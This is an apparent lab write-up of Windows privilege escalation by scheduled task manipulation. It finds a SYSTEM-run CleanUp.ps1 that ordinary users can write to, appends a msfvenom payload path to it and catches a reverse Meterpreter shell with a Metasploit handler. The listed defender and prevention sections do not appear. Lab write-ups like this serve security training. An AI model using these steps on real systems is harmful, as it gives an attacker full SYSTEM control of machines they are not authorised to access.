# Scheduled Task Manipulation

**Date:** June 2026<br>
**Author:** ShahinSecLab<br>
**Category:** Privilege Escalation<br>
**Difficulty:** Easy<br>
**Tools:** msfvenom, Metasploit, accesschk.exe

# Table of Contents

- [Introduction](#introduction)
- [Why This Attack Works](#why-this-attack-works)
- [Lab Setup](#lab-setup)
- [What I Needed Before Starting](#what-i-needed-before-starting)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Attack Flow](#attack-flow)
- [Step 1 — Exploring the File System](#step-1--exploring-the-file-system)
- [Step 2 — Finding the Vulnerable Script in DevTools](#step-2--finding-the-vulnerable-script-in-devtools)
- [Step 3 — Checking File Permissions on CleanUp.ps1](#step-4--checking-file-permissions-on-cleanupps1)
- [Step 4 — Injecting the Payload into CleanUp.ps1](#step-5--injecting-the-payload-into-cleanupps1)
- [Step 5 — Waiting for the Shell](#step-6--waiting-for-the-shell)
- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [What I Achieved](#what-i-achieved)

## Introduction

Scheduled Task Manipulation is a local privilege escalation technique. When a scheduled task runs a script or binary as SYSTEM and that script or binary has weak file permissions, a low privilege user can modify it. The next time the task runs, it executes the modified script as SYSTEM — giving full control of the machine without needing any exploit or CVE.

## Why This Attack Works

Windows scheduled tasks often run as `SYSTEM` to perform maintenance jobs like cleaning logs, running backups, or updating software. If the script or binary that the task runs has weak permissions — meaning normal users can write to it — I can add my own commands to that script. The next time the task fires, Windows runs my commands as `SYSTEM`.
The key thing here is I do not need to touch the task itself. I just modify the script it runs.

## Lab Setup

```
|    Component     |         Details         |
|------------------|-------------------------|
| Attacker Machine | Kali Linux              |
| Attacker IP      | 192.168.5.128           |
| Victim Machine   | Windows 10 (MSEDGEWIN10)|
| Victim IP        | 192.168.5.144           |
| Network          | VMware Host-Only Network|
| Domain           | WORKGROUP               |
```

## Tools Prepared on Kali Before Starting

```
| Tool            | Location                    | Purpose                                 |
|-----------------|-----------------------------|-----------------------------------------|
| accesschk.exe   | /home/kali/Desktop/tools/   | Check file permissions                  |
| rev.exe         | C:\PrivEsc\ on victim       | Malicious payload already on the victim |
| Metasploit      | Built into Kali             | Catch reverse shells                    |
```

## What I Needed Before Starting

```
|                   What                | Why                                   |
|---------------------------------------|---------------------------------------|
| Low privilege Meterpreter shell       | Starting point for the attack         |
| accesschk.exe                         | To check file permissions on scripts  |
| rev.exe already on the victim         | Payload to execute as SYSTEM          |
| Metasploit listener                   | To catch the shell when the task fires|
```

## What I Understood During the Process

While working through this attack I realized that:

- Scheduled tasks running as SYSTEM are very common in Windows environments
- If the script a task runs is writable by normal users, the machine is open to this attack
- I did not need to touch the scheduled task itself — just the script it runs
- The attack is completely passive once the payload is injected — I just wait for the task to fire
- Always check custom folders like `C:\DevTools`, `C:\BGinfo`, `C:\Temp` — admins often leave weak permissions on these

## Attack Flow

```
Already had a low privilege Meterpreter shell on the victim
                        ↓
Dropped into a CMD shell and explored C:\
                        ↓
Found C:\DevTools folder with CleanUp.ps1 inside
                        ↓
Opened CleanUp.ps1 — comment said it runs every minute as SYSTEM
                        ↓
Checked file permissions with accesschk.exe
                        ↓
Found full write access for normal users on CleanUp.ps1
                        ↓
Appended C:\PrivEsc\rev.exe to the end of CleanUp.ps1
                        ↓
Started Metasploit listener on port 4444
                        ↓
Waited for the scheduled task to fire
                        ↓
Task ran CleanUp.ps1 as SYSTEM — hit the injected line
                        ↓
rev.exe executed as SYSTEM
                        ↓
Metasploit caught the shell
                        ↓
Meterpreter session opened as SYSTEM
```

## Step 1 — Exploring the File System

I already had a Meterpreter shell on the victim machine as a low privilege user. I dropped into a CMD shell and started looking around the file system.

```bash
meterpreter > shell
```
```bash
C:\PrivEsc> cd ..
C:\> dir
```
**Output:**

```
 Directory of C:\

06/18/2026  03:59 AM    <DIR>          DevTools
06/22/2026  09:04 PM    <DIR>          inetpub
12/07/2019  02:14 AM    <DIR>          PerfLogs
06/23/2026  09:18 PM    <DIR>          PrivEsc
06/20/2026  03:12 AM    <DIR>          Program Files
05/05/2023  05:27 AM    <DIR>          Program Files (x86)
06/23/2026  05:45 AM    <DIR>          Temp
06/18/2026  04:40 AM    <DIR>          Users
06/22/2026  09:06 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)  28,201,332,736 bytes free
```
I went through each folder one by one looking for anything interesting. Two folders stood out straight away — `BGinfo` and `DevTools`. These are not default Windows folders, so I checked them both.

<p align="center">
  <img src="images/step1-1.png" width="600">
</p>

## Step 2 — Finding the Vulnerable Script in DevTools

```bash
C:\> cd DevTools
C:\DevTools> dir
```
**Output:**
```
06/18/2026  03:59 AM    <DIR>          .
06/18/2026  03:59 AM    <DIR>          ..
06/18/2026  03:59 AM               173 CleanUp.ps1
               1 File(s)            173 bytes
               2 Dir(s)  28,202,348,544 bytes free
```
<p align="center">
  <img src="images/step2-1.png" width="600">
</p>

I found `CleanUp.ps1`. I opened it straight away:

```bash
C:\DevTools> type CleanUp.ps1
```
```
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
```
The comment said everything I needed to know:

- Runs every minute
- Runs as SYSTEM
- The developer even left a note saying they should fix the permissions later — they never did

**This was my target.**

<p align="center">
  <img src="images/step2-2.png" width="600">
</p>

## Step 3 — Checking File Permissions on CleanUp.ps1

```bash
C:\PrivEsc> .\accesschk.exe /accepteula -uwqv user C:\DevTools\CleanUp.ps1
```
## Command Breakdown
```
|           Part           |                         Description                                                        |
|--------------------------|--------------------------------------------------------------------------------------------|
| C:\PrivEsc\accesschk.exe | Runs the **AccessChk** tool from the specified directory.                                  |
|     /accepteula          | Automatically accepts the Sysinternals license agreement so it doesn't prompt on first run.|
|         -u               | Suppresses errors (for example, "Access Denied") to keep the output clean.                 |
|         -w               | Displays only objects that have **write permissions**.                                     |
|         -q               | Quiet mode. Omits the banner and unnecessary output.                                       |
|         -v               | Verbose mode. Shows detailed permission information.                                       |
|         user             | Checks the permissions assigned to the **user** account.                                   |
| C:\DevTools\CleanUp.ps1  | The target file whose permissions are being checked.                                       |
```

**Output:**

```
RW C:\DevTools\CleanUp.ps1
        FILE_ALL_ACCESS
```
All permission was wide open. I could write whatever I wanted into CleanUp.ps1. Since the scheduled task runs this script every minute as SYSTEM, any command I add will run as SYSTEM automatically.

<p align="center">
  <img src="images/step4-1.png" width="600">
</p>

## Step 4 — Injecting the Payload into CleanUp.ps1

I had already created a payload named rev.exe using **msfvenom** and saved it to `C:\PrivEsc\rev.exe`.
I uploaded the payload from my Kali machine to the victim using Meterpreter.
Next, I appended the payload to the end of the CleanUp.ps1 script using the following command:

```bash
C:\DevTools> echo C:\privEsc\rev.exe >> C:\DevTools\CleanUp.ps1
```
I verified that the script had been modified by checking its file size:

```bash
C:\DevTools> dir
```
```
06/23/2026  10:00 PM               194 CleanUp.ps1
```
The file size increased from `173` bytes to `194` **bytes**, confirming that the payload had been successfully appended.

**The script now looked like this:**
```
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log
C:\privEsc\rev.exe
```
The last line was my payload. The next time the scheduled task runs the script, it will hit that line and execute `rev.exe` as `SYSTEM`.

## Step 5 — Waiting for the Shell

I started a Metasploit listener on Kali and waited. The task runs every minute so I did not have to do anything else.

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.5.128
set lport 4444
run
```
**Output:**

```
[*] Started reverse TCP handler on 192.168.5.128:4444
```

### Metasploit Caught the Connection

```
[*] Sending stage (244806 bytes) to 192.168.5.144
[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.144:50247) at 2026-06-24 01:49:16 -0400

meterpreter >
```
<p align="center">
  <img src="images/step6-1.png" width="600">
</p>

The scheduled task ran CleanUp.ps1 as SYSTEM, hit the injected line, and executed rev.exe — giving me a Meterpreter shell back on Kali without me doing anything else.